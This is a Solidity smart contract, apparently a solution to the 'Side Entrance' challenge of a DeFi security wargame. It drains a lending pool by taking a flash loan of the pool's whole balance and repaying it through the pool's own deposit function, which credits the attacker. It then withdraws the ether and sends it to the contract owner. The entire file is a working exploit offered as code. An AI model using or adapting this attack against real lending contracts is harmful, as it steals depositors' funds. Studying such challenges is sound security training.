// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "hardhat/console.sol";
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    address immutable owner;
    IPool immutable pool;

    error NotOwner();
    error NotPool();
    error NotTransferred();
    
    constructor(address _pool) payable {
        owner = msg.sender;
        pool = IPool(_pool);
    }

    function exploit() external payable {
        _onlyOwner();
        // flashloan everything
        pool.flashLoan(address(pool).balance);
        // take it all back 
        pool.withdraw();
        // send to owner
        (bool res, ) = msg.sender.call{value: address(this).balance}("");
        if (!res) revert NotTransferred();
    }

    function execute() external payable {
        _onlyPool();
        // deposit back
        pool.deposit{value: msg.value}();
    }

    function _onlyOwner() internal view {
        if (msg.sender != owner) revert NotOwner();
    }

    function _onlyPool() internal view {
        if (msg.sender != address(pool)) revert NotPool();
    }

    receive() external payable {}
}